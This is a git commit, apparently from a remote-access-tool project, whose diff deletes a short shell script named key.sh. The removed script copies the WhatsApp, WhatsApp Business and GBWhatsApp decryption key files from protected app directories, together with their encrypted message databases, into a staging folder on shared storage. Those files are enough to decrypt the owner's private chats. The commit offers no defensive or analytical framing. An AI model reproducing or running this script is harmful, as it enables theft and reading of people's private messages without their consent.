4a9f6d9ffa938d1a4a5587c9c69d7c5026007002
PyRAT-svg <62211611+PyRAT-svg@users.noreply.github.com>
2020-06-04 15:46:37 +0000

    Delete Key

--- key.sh
+++
@@ -1,7 +0,0 @@
-cd /sdcard && mkdir msfgaf && cd msfgaf && mkdir WhatsApp && mkdir GBWhatsApp && mkdir WhatsAppBusiness
-cp /data/data/com.whatsapp/files/key /sdcard/msfgaf/WhatsApp/key
-cp /data/data/com.whatsapp.w4b/files/key /sdcard/msfgaf/WhatsAppBusiness/key
-cp /data/data/com.gbwhatsapp/files/key /sdcard/msfgaf/GBWhatsApp/key
-cp /sdcard/WhatsApp/Databases/msgstore.db.crypt12 /sdcard/msfgaf/WhatsApp/msgstore.db.crypt12
-cp /sdcard/"WhatsApp Business"/Databases/msgstore.db.crypt12 /sdcard/msfgaf/WhatsAppBusiness
-cp /sdcard/GBWhatsApp/Databases/msgstore.db.crypt12 /sdcard/msfgaf/GBWhatsApp
